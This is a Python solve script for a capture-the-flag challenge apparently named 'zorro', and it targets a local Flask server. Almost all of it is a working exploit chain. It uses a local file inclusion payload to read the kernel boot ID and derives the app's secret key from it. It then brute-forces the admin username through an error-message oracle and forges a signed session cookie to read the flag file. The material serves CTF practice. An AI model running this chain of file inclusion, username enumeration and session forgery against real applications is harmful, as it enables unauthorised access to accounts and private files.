# crimist: my fully automated solve script for zorro
# flask_session_cookie_manager3.py from https://github.com/noraj/flask-session-cookie-manager/ - thanks for your work!

import httpx
from bs4 import BeautifulSoup
import string
import base64
import flask_session_cookie_manager3

client = httpx.Client()

# sign in with LFI payload
r = client.post("http://localhost:9080/signin", data={
    "name": "doesntmatter",
    "password": "doesntmatter",
    "fox": "/proc/sys/kernel/random/boot_id"
})

# execute LFI and get bootID
r = client.get("http://localhost:9080/fox")
soup = BeautifulSoup(r.text, features="lxml")
bootID = soup.p.string.strip()
print(f"bootID = {bootID}")

# generate secret based on bootid
secret = base64.b64encode(bootID.encode()).decode()[:-2]
print(f"secret = {secret}")

# brute force admin name one char at a time
print("brute forcing admin username")
r = client.get("http://localhost:9080/signout")
chars = string.ascii_lowercase
username = "admin"

for _ in range(10):
    found = False

    for char in chars:
        # guess with char
        r = client.post("http://localhost:9080/signin", data={
            "name": username + char,
            "password": "doesntmatter",
            "fox": "doesntmatter"
        })
        
        signout = client.get("http://localhost:9080/signout")
        
        if "Invalid name!" in r.text:
            username += char
            found = True
            break

    if not found:
        print("failed to find next char in brute force")
        exit()
    
    print(f"{username}")

# generate cookie with admin username and flag LFI payload then sign with secret
cookie = flask_session_cookie_manager3.FSCM.encode(secret, '{"fox":"/flag_la_volpe","name":"' + username + '"}')

# get flag!
flag = client.get("http://localhost:9080/fox", cookies={
    "session": cookie,
})
print(f"{flag.text}")
